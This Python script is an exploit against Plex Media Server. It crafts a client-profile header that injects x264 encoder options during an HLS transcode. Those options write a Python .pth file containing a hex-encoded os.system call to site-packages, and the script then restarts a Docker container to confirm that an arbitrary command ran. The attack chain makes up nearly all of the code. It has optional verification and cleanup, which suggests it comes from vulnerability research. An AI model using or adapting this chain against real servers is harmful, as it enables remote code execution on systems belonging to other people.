#!/usr/bin/env python3
import argparse
import pathlib
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request


PTH_DIRECTORY = "/config/.local/lib/python2.7/site-packages"


class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def http_get(url, params=None, headers=None, timeout=20):
    if params:
        url += ("&" if "?" in url else "?") + urllib.parse.urlencode(params)
    request = urllib.request.Request(url, headers=headers or {})
    try:
        opener = urllib.request.build_opener(NoRedirectHandler)
        with opener.open(request, timeout=timeout) as response:
            return response.read()
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", "replace")
        raise RuntimeError(f"GET {url}: HTTP {exc.code}: {body}") from exc


def docker_path_exists(container, path):
    result = subprocess.run(
        ["docker", "exec", container, "test", "-e", path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False,
    )
    return result.returncode == 0


def docker_remove_artifacts(container, pth_path, bootstrap_pattern):
    if not docker_path_exists(container, PTH_DIRECTORY):
        return
    names = (
        pathlib.PurePosixPath(pth_path).name,
        pathlib.PurePosixPath(pth_path).name + ".mbtree",
        bootstrap_pattern,
    )
    for name in names:
        subprocess.run(
            [
                "docker",
                "exec",
                container,
                "find",
                PTH_DIRECTORY,
                "-maxdepth",
                "1",
                "-type",
                "f",
                "-name",
                name,
                "-delete",
            ],
            check=True,
            stdout=subprocess.DEVNULL,
        )


def parse_args():
    parser = argparse.ArgumentParser(
        description="Plex client-profile augmentation to command-execution chain"
    )
    parser.add_argument("--url", required=True, help="Plex server origin")
    parser.add_argument("--rating-key", required=True, type=int)
    parser.add_argument("--token", required=True, help="Plex authentication token")
    parser.add_argument("--command", required=True, help="Command executed by Script Host")
    parser.add_argument("--container", help="Disposable Docker container to restart")
    parser.add_argument("--verify-path", help="Container path the command should create")
    parser.add_argument(
        "--keep-payload",
        action="store_true",
        help="Do not remove the generated .pth file after successful verification",
    )
    args = parser.parse_args()

    parsed = urllib.parse.urlsplit(args.url)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        parser.error("--url must be an HTTP(S) origin")
    if parsed.path not in ("", "/") or parsed.query or parsed.fragment:
        parser.error("--url must not contain a path, query, or fragment")
    if args.rating_key <= 0:
        parser.error("--rating-key must be greater than zero")
    if args.verify_path and not args.container:
        parser.error("--verify-path requires --container")
    if args.container and not args.verify_path:
        parser.error("--container requires --verify-path for execution verification")
    if args.keep_payload and not args.container:
        parser.error("--keep-payload requires --container")
    args.url = args.url.rstrip("/")
    return args


def main():
    args = parse_args()
    if args.container and docker_path_exists(args.container, args.verify_path):
        raise RuntimeError(f"verification path already exists: {args.verify_path}")

    stamp = int(time.time() * 1000)
    pth_path = f"{PTH_DIRECTORY}/plex_profile_rce_{stamp}.pth"
    bootstrap_name = f".plex-bootstrap-{stamp}-%s.ts"
    bootstrap_output = f"{PTH_DIRECTORY}/{bootstrap_name}"
    command_hex = args.command.encode("utf-8").hex()
    x264_options = (
        f"pass=1:stats={pth_path}:zones=\r"
        "0,0,q=20,stats=x\r"
        f"import\tos;os.system('{command_hex}'.decode('hex'))"
    )
    video_flags = (
        "-f hls -strftime 1 -strftime_mkdir 1 -hls_time 0.1 "
        f"{bootstrap_output} "
        "-map 0:v:0 -codec:0 libx264 "
        f"-x264opts {x264_options}"
    )
    profile_extra = (
        "add-transcode-target-settings("
        "type=videoProfile&context=streaming&protocol=hls&"
        f"VideoEncodeFlags={urllib.parse.quote(video_flags, safe='')})"
    )

    session = f"profile-rce-{stamp}"
    client = f"profile-rce-client-{stamp}"
    headers = {
        "X-Plex-Token": args.token,
        "X-Plex-Client-Identifier": client,
        "X-Plex-Session-Identifier": client,
        "X-Plex-Client-Profile-Name": "Web",
        "X-Plex-Client-Profile-Extra": profile_extra,
        "X-Plex-Product": "Plex Web",
        "X-Plex-Version": "4.0",
        "X-Plex-Platform": "Chrome",
        "X-Plex-Device": "Linux",
    }
    params = {
        "path": f"/library/metadata/{args.rating_key}",
        "mediaIndex": 0,
        "partIndex": 0,
        "protocol": "hls",
        "directPlay": 0,
        "directStream": 0,
        "videoResolution": "320x240",
        "videoQuality": 20,
        "maxVideoBitrate": 750,
        "session": session,
    }

    try:
        print("[1/4] Create transcode decision")
        http_get(
            f"{args.url}/video/:/transcode/universal/decision",
            params=params,
            headers=headers,
        )

        print("[2/4] Start transcode")
        http_get(
            f"{args.url}/video/:/transcode/universal/start.m3u8",
            params=params,
            headers=headers,
        )
        http_get(
            f"{args.url}/video/:/transcode/universal/session/{session}/base/index.m3u8",
            headers=headers,
        )
    except (OSError, RuntimeError):
        if args.container and not args.keep_payload:
            docker_remove_artifacts(
                args.container, pth_path, bootstrap_name.replace("%s", "*")
            )
        raise

    if not args.container:
        print(f"[3/4] Payload requested at: {pth_path}")
        print("[4/4] Placement and execution were not verified")
        return

    for _ in range(80):
        if docker_path_exists(args.container, pth_path):
            break
        time.sleep(0.25)
    else:
        if not args.keep_payload:
            docker_remove_artifacts(
                args.container, pth_path, bootstrap_name.replace("%s", "*")
            )
        raise RuntimeError(f"payload was not written to {pth_path}")

    print(f"[3/4] Verified payload: {pth_path}")
    verified = False
    try:
        if docker_path_exists(args.container, args.verify_path):
            print("[4/4] Command executed before the explicit restart")
        else:
            print("[4/4] Restart container and verify execution")
            subprocess.run(
                ["docker", "restart", args.container],
                check=True,
                stdout=subprocess.DEVNULL,
            )

        verified = docker_path_exists(args.container, args.verify_path)
        for _ in range(120):
            if docker_path_exists(args.container, args.verify_path):
                verified = True
                break
            time.sleep(0.25)

        for _ in range(80):
            try:
                http_get(f"{args.url}/identity", timeout=1)
                break
            except (OSError, RuntimeError):
                time.sleep(0.25)

        if not verified:
            raise RuntimeError("command execution could not be verified")
    finally:
        if not args.keep_payload:
            docker_remove_artifacts(
                args.container,
                pth_path,
                bootstrap_name.replace("%s", "*"),
            )
            print(f"Removed generated artifacts for run {stamp}")

    print(f"PASS: {args.verify_path} was created by the supplied command")


if __name__ == "__main__":
    try:
        main()
    except (OSError, RuntimeError, subprocess.SubprocessError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        raise SystemExit(1)
